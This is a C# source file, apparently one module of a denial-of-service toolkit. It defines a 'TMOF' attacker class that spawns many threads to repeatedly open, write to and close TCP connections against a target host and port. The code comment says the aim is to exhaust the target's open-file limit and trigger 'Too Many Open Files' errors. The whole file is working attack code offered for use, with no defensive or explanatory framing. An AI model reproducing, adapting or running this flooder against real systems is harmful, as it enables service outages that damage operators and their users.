using System.Net;
using System.Net.Sockets;
using System.Threading;
namespace GAS.Core
{
    /// <summary>
    /// this attack exploits pam open file limit 
    /// and causes "Too Many Open Files" error
    /// _i'_m  not sure it wotks well
    /// </summary>
    class TMOF : IAttacker
    {
        byte[] handshake = new byte[] { 1, 2, 3 };
        IPAddress _ip = IPAddress.Loopback;
        bool init = false;
        private Thread[] WorkingThreads;
        volatile int msockets = int.MaxValue;
        public TMOF(string _target, int _port, int _threadcount, int _max_sockets_on_attacker) {
            this.Target = _target;
            this.Port = _port;
            this.ThreadCount = _threadcount;
            this.msockets = _max_sockets_on_attacker;
            WorkingThreads = new Thread[ThreadCount];
        }
        public override void Start() {
            if ( IsFlooding )
                Stop();
            IsFlooding = true;
            for ( int i = 0; i < ThreadCount; i++ )
                ( WorkingThreads[i] = new Thread(new ParameterizedThreadStart(bw_DoWork)) ).Start(i);
            init = true;
        }
        private void bw_DoWork(object indexinthreads) {
            #region Wait 4 init
            while ( !init ) Thread.Sleep(100);
            int MY_INDEX_FOR_WORK = (int)indexinthreads;
            #endregion
            #region DDoS
            try {
                int csockets = 0;
                while ( IsFlooding ) {
                    while ( csockets > msockets )
                        Thread.Sleep(100);
                    try {
                        csockets++;
                        rSocket s = new rSocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        s.NoDelay = true;
                        s.Connect(Target, Port);
                        s.Shutdown(SocketShutdown.Receive);
                        s.Send(handshake);
                        s.Dispose();
                        csockets--;
                    }
                    catch { }
                }
            }
            catch { }
            #endregion
        }
        public override void Stop() {
            IsFlooding = false;
        }
    }
}
